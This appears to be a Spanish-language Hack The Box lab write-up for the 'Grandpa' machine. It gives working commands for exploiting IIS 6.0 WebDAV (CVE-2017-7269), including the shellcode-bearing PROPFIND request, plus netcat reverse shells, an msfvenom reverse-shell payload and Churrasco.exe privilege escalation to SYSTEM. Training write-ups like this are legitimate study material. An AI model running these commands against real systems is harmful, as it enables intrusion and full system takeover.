---
layout: single
title: Grandpa - Hack The Box
excerpt: "Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80, que está usando Microsoft IIS 6.0 WebDAV, usando un Exploit que nos conectara de forma remota a la máquina (CVE-2017-7269), de ahí podemos escalar privilegios a NT Authority System aprovechando que tenemos el privilegio SeImpersonatePrivilege, justamente usando Churrasco.exe (una variante de Juicy Potato para sistemas windows viejos) y utilizando un Payload."
date: 2023-02-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-grandpa/grandpa_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - IIS 6.0 WebDAV
  - Remote Buffer Overflow (RBO)
  - RBO - CVE-2017-7269
  - Juicy Potato
  - Churrasco
  - Reverse Shell
  - OSCP Style
---
![](/assets/images/htb-writeup-grandpa/grandpa_logo.png)
Esta fue una máquina fácil en la cual vamos a vulnerar el servicio HTTP del puerto 80, que está usando **Microsoft IIS 6.0 WebDAV**, usando un Exploit que nos conectara de forma remota a la máquina **(CVE-2017-7269)**, de ahi podemos escalar privilegios a **NT Authority System** aprovechando que tenemos el privilegio **SeImpersonatePrivilege**, justamente usando **Churrasco.exe** (una variante de **Juicy Potato** para sistemas Windows viejos) y utilizando un Payload.

# Recopilación de Información
## Traza ICMP
Vamos a lanzar un ping para ver si la máquina está conectada y en base al TTL veamos contra que SO nos enfrentamos.
```
ping -c 4 10.10.10.14 
PING 10.10.10.14 (10.10.10.14) 56(84) bytes of data.
64 bytes from 10.10.10.14: icmp_seq=1 ttl=127 time=131 ms
64 bytes from 10.10.10.14: icmp_seq=2 ttl=127 time=131 ms
64 bytes from 10.10.10.14: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.14: icmp_seq=4 ttl=127 time=133 ms

--- 10.10.10.14 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3003ms
rtt min/avg/max/mdev = 130.537/131.209/132.502/0.760 ms
```
Por el TTL sabemos que la máquina usa Windows. Es momento de hacer los escaneos de puertos y servicios.

## Escaneo de Puertos
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.14 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 18:33 CST
Initiating SYN Stealth Scan at 18:33
Scanning 10.10.10.14 [65535 ports]
Discovered open port 80/tcp on 10.10.10.14
Completed SYN Stealth Scan at 18:33, 28.32s elapsed (65535 total ports)
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.40s latency).
Scanned at 2023-02-18 18:33:22 CST for 28s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.40 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 24 (1.056KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Solamente hay un puerto abierto, el HTTP lo que nos dice que tiene una página web abierta, aun así, veamos qué servicio corre.

## Escaneo de Servicios
```
nmap -sC -sV -p80 10.10.10.14 -oN targeted                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-18 18:34 CST
Nmap scan report for 10.10.10.14
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sun, 02 Apr 2023 00:34:43 GMT
|_  WebDAV type: Unknown
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Mmmmm usa un **Microsoft IIS httpd 6.0**, ya nos hemos enfrentado a algo similar, pero en este caso no hay ningún **servicio FTP**. Es momento de analizar la página web.

# Análisis de Vulnerabilidades
Primero entremos a la página web:

![](/assets/images/htb-writeup-grandpa/Captura1.png)

No veo nada que nos pueda ayudar. Veamos lo que nos dice el **Wappalizer**.

![](/assets/images/htb-writeup-grandpa/Captura2.png)

Nada, no veo nada que nos ayude. Intentemos hacer **Fuzzing** para ver si puede encontrar algo, aunque lo dudo bastante.

## Fuzzing
```
wfuzz -c --hc=404,302 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.14/FUZZ/   
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.14/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                      
=====================================================================

000000001:   200        39 L     159 W      1433 Ch     "# directory-list-2.3-medium.txt"                                            
000000003:   200        39 L     159 W      1433 Ch     "# Copyright 2007 James Fisher"                                              
000000007:   200        39 L     159 W      1433 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"            
000000011:   200        39 L     159 W      1433 Ch     "# Priority ordered case sensative list, where entries were found"           
000000010:   200        39 L     159 W      1433 Ch     "#"                                                                          
000000009:   200        39 L     159 W      1433 Ch     "# Suite 300, San Francisco, California, 94105, USA."                        
000000006:   200        39 L     159 W      1433 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"              
000000008:   200        39 L     159 W      1433 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                 
000000005:   200        39 L     159 W      1433 Ch     "# This work is licensed under the Creative Commons"                         
000000012:   200        39 L     159 W      1433 Ch     "# on atleast 2 different hosts"                                             
000000002:   200        39 L     159 W      1433 Ch     "#"                                                                          
000000014:   200        39 L     159 W      1433 Ch     "http://10.10.10.14//"                                                       
000000004:   200        39 L     159 W      1433 Ch     "#"                                                                          
000000013:   200        39 L     159 W      1433 Ch     "#"                                                                          
000000016:   403        1 L      15 W       218 Ch      "images"                                                                     
000000203:   403        1 L      15 W       218 Ch      "Images"                                                                     
000003673:   403        1 L      15 W       218 Ch      "IMAGES"                                                                     
000045240:   200        39 L     159 W      1433 Ch     "http://10.10.10.14//"                                                       
000069324:   403        29 L     188 W      1529 Ch     "_private"                                                                   

Total time: 645.2624
Processed Requests: 220560
Filtered Requests: 220541
Requests/sec.: 341.8143
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

No pues nada, vamos directamente a buscar un Exploit para el servicio **Microsoft IIS httpd 6.0**.
```
searchsploit Microsoft IIS httpd 6.0
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```
Jajaja no pues no, busquemos por internet.

Encontré el siguiente Exploit aunque menciona algo llamado **WebDAV**, no sé qué sea, vamos a investigarlo y luego analizamos el Exploit.

**WebDAV es un grupo de trabajo del Internet Engineering Task Force. El término significa "Autoría y versionado distribuidos por Web", y se refiere al protocolo que el grupo definió. El objetivo de WebDAV es hacer de la World Wide Web un medio legible y editable, en línea con la visión original de Tim Berners-Lee.**

Ok, ya sabemos que es, ahora veamos el Exploit.
```
searchsploit Microsoft IIS 6.0 WebDAV
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                   | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                    | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                            | windows/remote/8754.patch
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Hay varios, pero vamos a probar el que encontramos por internet que es el primero.

# Explotación de Vulnerabilidades
**ADVERTENCIA**: 

Este Exploit me jodio la máquina varias veces porque probe distintos Exploits para escalar privilegios, ten cuidado porque si tienes que salirte forzosamente usando **crtl + c** desde dentro de la máquina, tendrás que reiniciarla, o al menos eso me paso a mi porque el servicio HTTP del puerto 80 dejo de funcionar.
```
searchsploit -x windows/remote/41738.py  
  Exploit: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/41738
     Path: /usr/share/exploitdb/exploits/windows/remote/41738.py
    Codes: CVE-2017-7269
 Verified: False
File Type: ASCII text, with very long lines (2183)
```
Mmmmm no entiendo muy bien cómo usarlo, podría ser que debemos meter los datos de la página web y un localhost o algo así. Creo que será mejor buscar como usar este Exploit antes de utilizar otro.

Investigando un poco, nos aparece este GitHub:

* https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269

Ahí viene el mismo que vamos a ocupar, pero ya nos explica que debemos poner para poder usarlo:
```
if len(sys.argv)<5:
    print 'usage:iis6webdav.py targetip targetport reverseip reverseport\n'
    exit(1)
```

Así que vamos a descargarlo.
```
git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git  
Clonando en 'iis6-exploit-2017-CVE-2017-7269'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
Recibiendo objetos: 100% (6/6), listo.
```
Y ahora vamonos por pasos.

* Levantemos una netcat:
```
nc -nvlp 443                         
listening on [any] 443 ...
```
* Renombremos el Exploit para que sea **.py**:
```
mv iis6\ reverse\ shell IIS6_Exploit.py
ls
IIS6_Exploit.py  README.md
```
* Probemos el Exploit:
```
python2 IIS6_Exploit.py 10.10.10.14 80 10.10.14.14 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```
* Y estamos dentro:
```
nc -nvlp 443                         
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
¿Que? ¿Ya somos Root? Pues nel no te emociones, somo Root pero en el servicio de la red, lo cual no nos ayuda mucho. Vamos a ver que hay dentro de la máquina.

# Post Explotación
## Enumeración de Windows
```
c:\windows\system32\inetsrv>cd C:\
cd C:\
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF
 Directory of C:\
04/12/2017  05:27 PM    <DIR>          ADFS
04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
04/12/2017  05:04 PM                 0 CONFIG.SYS
04/12/2017  05:32 PM    <DIR>          Documents and Settings
04/12/2017  05:17 PM    <DIR>          FPSE_search
04/12/2017  05:17 PM    <DIR>          Inetpub
12/24/2017  08:18 PM    <DIR>          Program Files
09/16/2021  12:52 PM    <DIR>          WINDOWS
04/12/2017  05:05 PM    <DIR>          wmpub
               2 File(s)              0 bytes
               7 Dir(s)   1,296,433,152 bytes free
```
Hay algunas carpetas que podrian contener algo, veámoslas:
```
C:\>cd ADFS
cd ADFS
C:\ADFS>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF
 Directory of C:\ADFS
04/12/2017  05:27 PM    <DIR>          .
04/12/2017  05:27 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   1,296,429,056 bytes free
C:\ADFS>cd ..
cd ..
```
No hay nada.
```
C:\>cd FPSE_search
cd FPSE_search
C:\FPSE_search>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF
 Directory of C:\FPSE_search
04/12/2017  05:17 PM    <DIR>          .
04/12/2017  05:17 PM    <DIR>          ..
               0 File(s)              0 bytes
               2 Dir(s)   1,296,424,960 bytes free
C:\FPSE_search>cd ..
cd ..
```
Nada de nada.
```
C:\>cd Documents and Settings
cd Documents and Settings

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\Documents and Settings

04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  05:32 PM    <DIR>          Harry
               0 File(s)              0 bytes
               5 Dir(s)   1,296,420,864 bytes free

C:\Documents and Settings>cd Harry
cd Harry
Access is denied.
```
Aquí está el usuario y el administrador, aquí ya se aclara que no somos ni usuario. Veamos que privilegios tenemos y la información del sistema.
```
C:\Documents and Settings>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```
Uffff tenemos el **SeImpersonatePrivilege**, veamos el sistema:
```
C:\Documents and Settings>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
```
Muy bien, aquí podemos usar nuestra herramienta **Windows Exploit Suggester**, aprovechemosla y veamos que nos dice:
```
python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2003 SP2 32-bit'
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
...
```
Salen varias opciones, pero no vamos a probar ninguno, ¿por qué? por mis huevos, ¿como ves perro?

Jajajaja no es cierto, esto es porque después de casi 3 horas de probar varios Exploits y en lo que tenía que reiniciar la máquina varias veces como mencione antes. ¡NO FUNCIONO NINGUNO!

Los que probe fueron:
* MS14-070 - Ambas versiones
* MS11-046
* MS11-062
* MS15-051

No sé porque razón ninguno funciono, así que en este caso ahora si vamos a aprovecharnos del privilegio **SeImpersonatePrivilege**. Para abusar de este privilegio vamos a usar **Juicy Potato**, pero esta será una variante pues la versión de **Windows** de la máquina es bastante vieja.

Con solo poner **Windows server 2003 juicy potato exploit** en el buscador, nos dará una página web, la abrimos y vemos la explicación.

* https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/

La versión de **Juicy Potato** que ofrece esta página no nos servirá, pero si nos vamos hasta abajo ahí vendrá una variante llamada **Churrasco.exe**, esa es la que vamos a usar.

* https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

Siguiendo las indicaciones de la página, una vez descargado el **Churrasco.exe** vamos a hacer lo siguiente:

* Crearemos un Payload para cargar una Reverse Shell:
```
msfvenom -p windows/shell_reverse_tcp LHOST=Tu_IP LPORT=1337 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```
**OJO**: 

Ten cuidado y no vayas a usar el mismo puerto que usaste para acceder a la máquina porque sigue en activo.

* Abrimos un servidor con Impacket para subir el Payload y el Churrasco:
```
mpacket-smbserver smbFolder $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
* Descargamos los archivos en la máquina:
```
C:\WINDOWS\Temp\Privesc>copy \\Tu_IP\smbFolder\churrasco.exe churrasco.exe
copy \\Tu_IP\smbFolder\churrasco.exe churrasco.exe
        1 file(s) copied.
C:\WINDOWS\Temp\Privesc>copy \\Tu_IP\smbFolder\shell.exe shell.exe
copy \\Tu_IP\smbFolder\shell.exe shell.exe
        1 file(s) copied.
```
**NOTA**: Esta vez no usamos **certutil.exe** porque no funciona tampoco.

* Activamos una netcat con el puerto que pusimos en el Payload:
```
nc -nvlp 1337
listening on [any] 1337 ...
```
* Una vez dentro ambos archivos, activamos el Churrasco:
```
C:\WINDOWS\Temp\Privesc>churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
churrasco.exe -d "C:\WINDOWS\Temp\Privesc\shell.exe"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 668 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 672 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 676 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 684 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x730
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found SYSTEM token 0x728
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!
```
* Y ya somo Root:
```
 nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.
C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```
Solamente busca las flags en el directorio **Documents and Settings**, cada flag está en su respectivo directorio. 

## Links de Investigación
* https://www.exploit-db.com/exploits/41738
* https://www.google.com/search?client=firefox-b-e&q=WebDAV+que+es
* https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-062
* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070
* https://github.com/r00t-3xp10it/venom/issues/1
* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
* https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/ 
* https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

# Nota Final
Todo este procedimiento, puedes volverlo a hacer con la **máquina Granny** de HTB, porque es la misma configuración, misma versión de **Windows**, mismo servicio, mismo todo. Por eso puedes repetir todo este procedimiento en dicha máquina.

![](/assets/images/htb-writeup-grandpa/granny_logo.png)

# FIN

<!--
## Solución para MS14-070
```
typedef DWORD NTSTATUS;
NTSTATUS WINAPI NtQuerySystemInformation (
        SYSTEM_INFORMATION_CLASS   SystemInformationClass,
        PVOID                      SystemInformation,
        ULONG                      SystemInformationLength,
        PULONG                     ReturnLength
);

typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
``¨
-->

